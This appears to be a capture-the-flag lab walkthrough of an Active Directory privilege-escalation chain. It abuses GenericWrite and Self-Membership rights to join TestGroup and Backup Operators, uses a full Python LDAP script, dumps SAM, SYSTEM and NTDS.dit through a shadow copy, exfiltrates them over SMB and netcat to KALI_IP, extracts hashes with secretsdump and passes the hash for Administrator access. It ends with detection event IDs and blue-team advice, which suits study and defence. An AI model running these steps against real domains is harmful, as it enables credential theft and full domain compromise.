# DACL Attack Path - AddMembers Abuse

Complete walkthrough of exploiting DACL permissions via AddMembers rights in Active Directory.

---

## Attack Overview

**Objective**: Exploit DACL permissions to:
1. Abuse GenericWrite on TestGroup to access restricted share
2. Abuse Self-Membership on Backup Operators to dump domain credentials and gain Administrator access

**Target Environment**:
- Domain: `corp.local`
- DC: `10.10.10.10` (DC01)
- Compromised Account: `lowpriv:Password123`

---

## Question 1: TestGroup Share Access

### Enumeration

**Identify lowpriv's rights over TestGroup using BloodHound:**

```bash
# Collect AD data
bloodhound-python -d corp.local -u lowpriv -p Password123 -c all -ns 10.10.10.10

# In BloodHound GUI:
# 1. Search for "lowpriv"
# 2. Right-click → "Outbound Object Control" → "First Degree Object Control"
# 3. Look for TestGroup edge
```

**Alternative - dacledit.py:**

```bash
cd /path/to/impacket
python3 examples/dacledit.py -principal lowpriv -target 'TestGroup' -dc-ip 10.10.10.10 corp.local/lowpriv:Password123
```

**Result**: lowpriv has **GenericWrite** on TestGroup

### Exploitation

**Add lowpriv to TestGroup:**

```bash
# GenericWrite allows using net (not Self-Membership restricted)
net rpc group addmem "TestGroup" lowpriv -U "corp.local"/"lowpriv"%"Password123" -S "10.10.10.10"
```

**Verify membership:**

```bash
net rpc group members "TestGroup" -U "corp.local"/"lowpriv"%"Password123" -S "10.10.10.10"
```

**Access the share and retrieve flag:**

```bash
# Connect via SMB as lowpriv (now TestGroup member)
impacket-smbclient corp.local/lowpriv:Password123@10.10.10.10

# Inside smbclient:
shares
use TestGroup
ls
cat flag.txt
```

**Flag**: `[REDACTED]`

---

## Question 2: Administrator Access via Backup Operators

### Enumeration

**Identify lowpriv users rights over Backup Operators:**

```bash
# Using dacledit.py
python3 examples/dacledit.py -principal lowpriv -target 'Backup Operators' -dc-ip 10.10.10.10 corp.local/lowpriv:Password123
```

**Expected output:**
```
[*]   ACE[0] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     Access mask               : Self
[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : lowpriv
```

**Result**: lowpriv has **Self-Membership** on Backup Operators

### Exploitation - Add to Backup Operators

**Critical**: Self-Membership requires LDAP protocol (net will fail with ACCESS_DENIED)

**LDAP group modification script (ldap_group_modifier.py):**

```python
#!/usr/bin/env python3
"""
LDAP Group Membership Modifier
Adds users to Active Directory groups via direct LDAP operations.
Useful for abusing Self-Membership and other attribute-level DACL rights
that don't work through legacy SAMR/RPC interfaces.
"""

import argparse
import sys
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.core.exceptions import LDAPException


class LDAPGroupManager:
    def __init__(self, domain, username, password):
        self.domain = domain
        self.username = username
        self.password = password
        self.connection = None
        self.base_dn = self._build_base_dn()
        
    def _build_base_dn(self):
        """Convert domain.local to DC=domain,DC=local"""
        return ','.join([f'DC={part}' for part in self.domain.split('.')])
    
    def connect(self):
        """Establish LDAP connection to domain controller"""
        try:
            server = Server(self.domain, get_info=ALL)
            self.connection = Connection(
                server,
                user=f'{self.domain}\\{self.username}',
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            print(f'[+] Successfully connected to {self.domain}')
            return True
        except LDAPException as e:
            print(f'[-] Connection failed: {e}')
            return False
    
    def _find_object_dn(self, object_name, object_class):
        """Generic search for AD object DN by name and class"""
        search_filter = f'(&(objectClass={object_class})(|(cn={object_name})(sAMAccountName={object_name})))'
        
        self.connection.search(
            search_base=self.base_dn,
            search_filter=search_filter,
            attributes=['distinguishedName']
        )
        
        if self.connection.entries:
            dn = self.connection.entries[0].distinguishedName.value
            print(f'[+] Found {object_class}: {object_name}')
            return dn
        else:
            print(f'[-] {object_class.capitalize()} not found: {object_name}')
            return None
    
    def get_group_members(self, group_name):
        """Retrieve current group members"""
        group_dn = self._find_object_dn(group_name, 'group')
        if not group_dn:
            return None
        
        self.connection.search(
            search_base=group_dn,
            search_filter='(objectClass=group)',
            attributes=['member']
        )
        
        if self.connection.entries and hasattr(self.connection.entries[0], 'member'):
            return self.connection.entries[0].member.values
        return []
    
    def add_member(self, group_name, user_name):
        """Add user to group via LDAP modify operation"""
        # Get group DN
        group_dn = self._find_object_dn(group_name, 'group')
        if not group_dn:
            return False
        
        # Get user DN
        user_dn = self._find_object_dn(user_name, 'user')
        if not user_dn:
            return False
        
        # Check if already member
        current_members = self.get_group_members(group_name)
        if user_dn in current_members:
            print(f'[!] {user_name} is already a member of {group_name}')
            return True
        
        # Add to group
        try:
            success = self.connection.modify(
                group_dn,
                {'member': [(MODIFY_ADD, [user_dn])]}
            )
            
            if success:
                print(f'[+] Successfully added {user_name} to {group_name}')
                return True
            else:
                print(f'[-] Failed to add user: {self.connection.result}')
                return False
                
        except LDAPException as e:
            print(f'[-] LDAP modification error: {e}')
            return False


def main():
    parser = argparse.ArgumentParser(
        description='Add users to Active Directory groups via LDAP',
        epilog='Example: %(prog)s -d corp.local -u lowpriv -p Password123 -g "Backup Operators" -m lowpriv'
    )
    
    parser.add_argument('-d', '--domain', required=True,
                       help='Target domain (e.g., corp.local)')
    parser.add_argument('-u', '--username', required=True,
                       help='Username with group modification rights')
    parser.add_argument('-p', '--password', required=True,
                       help='Password for authentication')
    parser.add_argument('-g', '--group', required=True,
                       help='Target group name')
    parser.add_argument('-m', '--member', required=True,
                       help='Username to add to group')
    
    args = parser.parse_args()
    
    # Initialize manager and connect
    manager = LDAPGroupManager(args.domain, args.username, args.password)
    
    if not manager.connect():
        sys.exit(1)
    
    # Add member to group
    if manager.add_member(args.group, args.member):
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == '__main__':
    main()
```

**Execute the script:**

```bash
python3 ldap_group_modifier.py -d corp.local -u lowpriv -p Password123 -g "Backup Operators" -m lowpriv
```

**Verify membership:**

```bash
net rpc group members 'Backup Operators' -U corp.local/lowpriv%Password123 -S 10.10.10.10
```

### Privilege Escalation - Abuse Backup Operators

**Important**: After adding lowpriv to Backup Operators, you must:
1. Re-authenticate (new Kerberos ticket with updated group membership)
2. Launch cmd.exe as Administrator (required for UAC/SeBackupPrivilege)

#### Step 1: Connect via RDP

```bash
xfreerdp /u:lowpriv /p:Password123 /d:corp.local /v:10.10.10.10
```

#### Step 2: Launch Administrator Command Prompt

- Right-click `cmd.exe` → "Run as administrator"
- Enter lowpriv's credentials when prompted
- UAC will allow elevation because Backup Operators is a privileged group

#### Step 3: Verify Privileges

```cmd
whoami /priv
```

**Expected output:**
```
Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
```

#### Step 4: Dump SAM & SYSTEM Registry Hives

```cmd
reg save hklm\sam C:\users\Public\sam
reg save hklm\system C:\users\Public\system
```

#### Step 5: Create Shadow Copy for NTDS.dit

**Create diskshadow script:**

```cmd
echo set context persistent nowriters > C:\Users\Public\diskshadowscript.txt
echo set metadata c:\windows\temp\file.cab >> C:\Users\Public\diskshadowscript.txt
echo set verbose on >> C:\Users\Public\diskshadowscript.txt
echo begin backup >> C:\Users\Public\diskshadowscript.txt
echo add volume c: alias mydrive >> C:\Users\Public\diskshadowscript.txt
echo create >> C:\Users\Public\diskshadowscript.txt
echo expose %mydrive% p: >> C:\Users\Public\diskshadowscript.txt
echo end backup >> C:\Users\Public\diskshadowscript.txt
```

**Execute diskshadow:**

```cmd
diskshadow /s C:\Users\Public\diskshadowscript.txt
```

**Expected output:**
```
The shadow copy was successfully exposed as p:\.
```

#### Step 6: Copy NTDS.dit from Shadow Copy

```cmd
robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit
```

### Exfiltration

**Option 1: SMB Server (Recommended)**

**On Kali:**

```bash
# Start SMB server with authentication
sudo smbserver.py -smb2support -username osher -password pass123 share /tmp
```

**On Windows:**

```cmd
# Map network drive
net use \\KALI_IP\share /user:osher pass123

# Copy files
copy C:\Users\Public\sam \\KALI_IP\share\
copy C:\Users\Public\system \\KALI_IP\share\
copy C:\Users\Public\ntds.dit \\KALI_IP\share\
```

**Option 2: Netcat (Faster)**

**On Kali:**

```bash
# Receive ntds.dit
nc -lvnp 4444 > ntds.dit

# Receive sam
nc -lvnp 4445 > sam

# Receive system
nc -lvnp 4446 > system
```

**On Windows (if nc.exe available):**

```cmd
nc.exe KALI_IP 4444 < C:\Users\Public\ntds.dit
nc.exe KALI_IP 4445 < C:\Users\Public\sam
nc.exe KALI_IP 4446 < C:\Users\Public\system
```

**Option 3: RDP Clipboard (Slowest - NOT Recommended)**

Only use for small files or as last resort.

### Credential Extraction

**Extract all hashes from ntds.dit:**

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

**Example output:**
```
[*] Target system bootKey: 0x1b39bb8394e20baa2d7ffc0e85e6cbe2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1636d5aaaf6cd0814af056f16001458e
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[KRBTGT_HASH]:::
<additional accounts...>
```

**Important**: The first Administrator hash is the **local machine** Administrator. For this lab, that's what we need.

### Pass-the-Hash Attack

**Connect as Administrator using hash:**

```bash
impacket-wmiexec administrator@10.10.10.10 -hashes :[ADMIN_HASH]
```

**Retrieve the flag:**

```cmd
cd C:\Users\Administrator\Desktop
type flag.txt
```

**Flag**: `[REDACTED]`

---

## Key Takeaways

### Technical Lessons

1. **Self-Membership vs Other Rights**:
   - Self-Membership: LDAP only (net fails)
   - GenericWrite/GenericAll: net works

2. **Protocol Differences**:
   - `net` uses SMB/RPC (higher level)
   - LDAP speaks directly to directory (honors granular ACEs)

3. **Re-authentication Required**:
   - Adding user to group doesn't update current session
   - New logon = new Kerberos ticket with updated groups

4. **Backup Operators Privileges**:
   - SeBackupPrivilege: Read any file (bypass ACLs)
   - SeRestorePrivilege: Write any file (bypass ACLs)
   - Requires UAC elevation even for non-admins

5. **Shadow Copy Necessity**:
   - NTDS.dit is locked by AD DS service
   - Shadow copy creates unlocked snapshot
   - Can then use robocopy with /b flag (backup mode)

### Attack Chain Summary

**Question 1 (TestGroup):**
```
lowpriv (GenericWrite) → Add self to TestGroup → Access \\DC01\TestGroup\flag.txt
```

**Question 2 (Administrator):**
```
lowpriv (Self-Membership) → Add to Backup Operators → Re-auth + UAC elevation →
SeBackupPrivilege → Dump SAM/SYSTEM/NTDS.dit → Extract hashes →
Pass-the-Hash as Administrator → C:\Users\Administrator\Desktop\flag.txt
```

### Common Pitfalls

1. **Using net for Self-Membership**: Will fail with ACCESS_DENIED
2. **Forgetting to re-authenticate**: New groups won't apply to existing session
3. **Not elevating with UAC**: SeBackupPrivilege requires Administrator context
4. **RDP clipboard for large files**: Extremely slow and unreliable
5. **Confusing local vs domain Administrator**: Check secretsdump output carefully

---

## Tools Used

- **BloodHound**: DACL enumeration and visualization
- **dacledit.py** (Impacket): Query ACL rights
- **ldap3** (Python): LDAP operations for Self-Membership abuse
- **net** (Samba): SMB/RPC group operations
- **reg**: Registry hive backup
- **diskshadow**: VSS shadow copy creation
- **robocopy**: File copy with backup privileges
- **secretsdump.py** (Impacket): Credential extraction
- **wmiexec.py** (Impacket): Pass-the-Hash execution
- **smbclient** / **smbclient.py**: SMB share access

---

## Detection Opportunities

### Event IDs to Monitor

1. **4728**: User added to security-enabled global group
2. **4732**: User added to security-enabled local group
3. **4756**: User added to security-enabled universal group
4. **7036**: Volume Shadow Copy Service state changes
5. **4673**: Sensitive privilege use (SeBackupPrivilege)
6. **4624**: Account logon (Type 3 = Network, Type 10 = RDP)

### Detection Logic

**Suspicious Group Additions:**
```
Event 4732 WHERE
  Group = "Backup Operators" AND
  Subject.Account NOT IN (AdminAccounts) AND
  NOT (TargetAccount IN (ServiceAccounts))
```

**Shadow Copy Creation + File Access:**
```
Event 7036 (VSS started) FOLLOWED BY
Event 4663 (File access to NTDS.dit or SAM) WITHIN 10 minutes
```

**SeBackupPrivilege Usage:**
```
Event 4673 WHERE
  Privilege = "SeBackupPrivilege" AND
  Account NOT IN (BackupSoftwareAccounts)
```

### Blue Team Recommendations

1. **Restrict Backup Operators membership**: Require manager approval
2. **Monitor VSS operations**: Alert on shadow copy creation outside backup windows
3. **Audit DACL changes**: Regular reviews of sensitive group ACLs
4. **Implement tiered admin model**: Separate backup operations from domain admin tasks
5. **Enable advanced auditing**: File access auditing on NTDS.dit, SAM, SYSTEM

---

## References

- Microsoft Docs: Active Directory Security Groups
- Microsoft Docs: Backup Operators Built-in Group
- Impacket Documentation: https://github.com/fortra/impacket
- BloodHound Documentation: https://bloodhound.readthedocs.io/

---

**Date**: February 2026
